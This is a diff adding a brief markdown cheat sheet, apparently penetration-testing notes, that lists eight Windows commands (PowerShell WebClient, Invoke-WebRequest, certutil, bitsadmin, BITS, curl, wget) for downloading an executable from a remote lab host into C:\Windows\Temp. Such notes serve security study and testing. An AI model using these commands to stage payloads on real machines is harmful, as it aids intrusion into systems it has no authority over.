@@ -1,1 +1,18 @@
+## File Transfer
+1.PowerShell WebClient (very common)
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')"
+2.Invoke-WebRequest (IWR) (extremely common)
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"
+3.Short version: IWR http://10.10.10.10/file.exe -OutFile C:\Windows\Temp\file.exe
+4.Certutil (very common, often allowed)
+certutil -urlcache -split -f http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
+5.Bitsadmin (classic, still appears often)
+bitsadmin /transfer myjob /download /priority normal http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
+6.Start-BitsTransfer (PowerShell BITS)
+Start-BitsTransfer -Source http://10.10.10.10/file.exe -Destination C:\Windows\Temp\file.exe
+7.Curl (common if curl is installed or on newer Windows)
+curl http://10.10.10.10/file.exe -o C:\Windows\Temp\file.exe
+8. wget (If installed)
+wget -O C:\path\to\file.exe http://example.com/file.exe
+
 
